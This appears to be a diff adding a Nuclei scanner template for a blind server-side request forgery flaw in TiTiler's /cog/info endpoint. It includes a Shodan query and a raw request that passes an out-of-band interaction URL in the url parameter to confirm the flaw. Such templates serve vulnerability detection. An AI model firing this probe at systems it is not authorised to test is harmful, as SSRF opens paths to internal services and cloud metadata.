@@ -1,0 +1,36 @@
+id: titiler-blind-ssrf
+
+info:
+  name: TiTiler 盲式服务端请求伪造漏洞
+  author: xbow,DhiyaneshDK
+  severity: high
+  description: |
+    TiTiler 作为面向 Cloud Optimized GeoTIFF (COG) 的动态瓦片服务器，其 /cog/info 接口对 url 参数的处理存在缺陷，攻击者可利用该参数发起任意内部或外部 HTTP 请求，构成盲式服务端请求伪造（Blind SSRF）风险。
+
+    https://github.com/developmentseed/titiler
+  reference:
+    - https://xbow.com/blog/xbow-titiler-lfi/
+  classification:
+    cwe-id: CWE-918
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"TiTiler"
+  tags: TiTiler
+  remediation: >-
+    升级到已修复版本，并通过允许列表限制出站请求的协议、主机、端口和目标地址。阻断对云元数据服务及内部管理网络的访问，并在 URL 解析和规范化后再次校验。
+
+http:
+  - raw:
+      - |
+        GET /cog/info?url=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(interactsh_protocol, "dns")'
+          - 'contains(body, "<imageAttributes> in document")'
+        condition: and
+
+# digest: 490a00463044022012b96ad80a95b9d69b70ddf72019f44e54242e1a20eb398d95a2899bcff24bfd0220604f477f5da7b998e6b6281be0ea7afa145ce09b5fd79fab6ccf593b5cb862cb:922c64590222798bb761d5b6d8e72950
